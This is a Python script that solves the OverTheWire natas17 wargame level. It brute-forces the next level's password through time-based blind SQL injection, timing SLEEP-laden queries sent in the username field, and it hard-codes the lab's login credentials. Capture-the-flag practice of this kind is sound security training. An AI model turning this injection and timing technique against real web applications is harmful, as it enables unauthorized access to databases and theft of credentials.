"""
    Hadar Shahar
    OverTheWire - natas17
    Brute force the password using time based SQL injection.
    Every query contains also a SLEEP(n) command, which executes for every matching row in the databse.
    By measuring each request time, one can understand how many matches it had,
    and thus brute force the password.
"""

import requests
import string
import time

url = 'http://natas17.natas.labs.overthewire.org/index.php?debug'
natas17_username = 'natas17'
natas17_password = '8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw'
sleep_time = 0.3
# use the BINARY keyword to force a case-sensitive comparison
base_query = 'natas18" AND password LIKE BINARY "{}" AND SLEEP({});-- '


def measure_req_time(session, url, data):
    start = time.time()
    r = session.post(url, data=data)
    end = time.time()
    return end - start


s = requests.Session()
s.auth = (natas17_username, natas17_password)

# the previous level passwords were composed of ascii letters (lowercase and uppercase) and digits
charset = string.digits + string.ascii_letters
new_charset = ''
for char in charset:
    # check is the password contains this character
    data = {'username': base_query.format(f'%{char}%', sleep_time)}
    req_time = measure_req_time(s, url, data)
    print(char, req_time)
    if req_time > sleep_time:
        new_charset += char
print(repr(new_charset))
# '047dghjlmpqsvwxyCDFIKOPR'

password = ''
while True:
    for char in new_charset:
        data = {'username': base_query.format(f'{password+char}%', sleep_time)}
        if measure_req_time(s, url, data) > sleep_time:
            password += char
            print(len(password), password)
            break
    else:
        print('done')
        break
